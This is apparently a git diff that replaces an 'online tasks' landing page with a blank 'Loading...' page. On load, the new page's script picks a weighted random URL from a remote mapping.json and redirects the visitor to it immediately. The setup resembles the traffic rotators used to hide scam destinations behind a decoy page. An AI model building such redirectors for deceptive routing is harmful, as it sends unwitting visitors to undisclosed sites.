@@ -1,61 +1,40 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="zh">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Online Tasks Overview</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            margin: 0;
-            padding: 0;
-            background: #f4f4f4;
-            color: #333;
+  <meta charset="UTF-8">
+  <title>Loading...</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <script>
+    async function redirect() {
+      try {
+        const res = await fetch("mapping.json?ts=" + Date.now()); // 加随机参数避免缓存
+        const data = await res.json();
+        const activeLinks = data.links.filter(l => l.active);
+
+        if (activeLinks.length === 0) {
+          return; // 没有可用链接则停留
         }
-        .container {
-            max-width: 600px;
-            margin: 50px auto;
-            background: #fff;
-            padding: 25px;
-            border-radius: 12px;
-            box-shadow: 0 0 15px rgba(0,0,0,0.1);
-            text-align: center;
-        }
-        h1 {
-            color: #2a9df4;
-            font-size: 28px;
-            margin-bottom: 15px;
-        }
-        p {
-            font-size: 16px;
-            line-height: 1.5;
-            margin: 10px 0;
-        }
-        .button {
-            display: inline-block;
-            margin-top: 20px;
-            padding: 14px 30px;
-            background: #2a9df4;
-            color: #fff;
-            text-decoration: none;
-            border-radius: 8px;
-            font-weight: bold;
-            font-size: 16px;
-        }
-    </style>
+
+        // 按权重抽签
+        const weighted = [];
+        activeLinks.forEach(l => {
+          for (let i = 0; i < (l.weight || 1); i++) {
+            weighted.push(l.url);
+          }
+        });
+        const targetUrl = weighted[Math.floor(Math.random() * weighted.length)];
+
+        // 立即跳转
+        window.location.replace(targetUrl);
+      } catch (e) {
+        console.error("跳转失败", e);
+      }
+    }
+
+    redirect();
+  </script>
 </head>
 <body>
-    <div class="container">
-        <h1>Explore Online Tasks</h1>
-        <p>
-            Discover simple online tasks you can complete using your phone or computer.  
-            These tasks are designed to help you gain practical digital skills and experience.
-        </p>
-        <p>
-            Tasks are flexible and easy to try, suitable for beginners or those looking to learn new skills.  
-            Explore at your own pace and see the types of tasks available.
-        </p>
-        <a href="https://your-safe-page.com" class="button">Learn More</a>
-    </div>
 </body>
 </html>
+
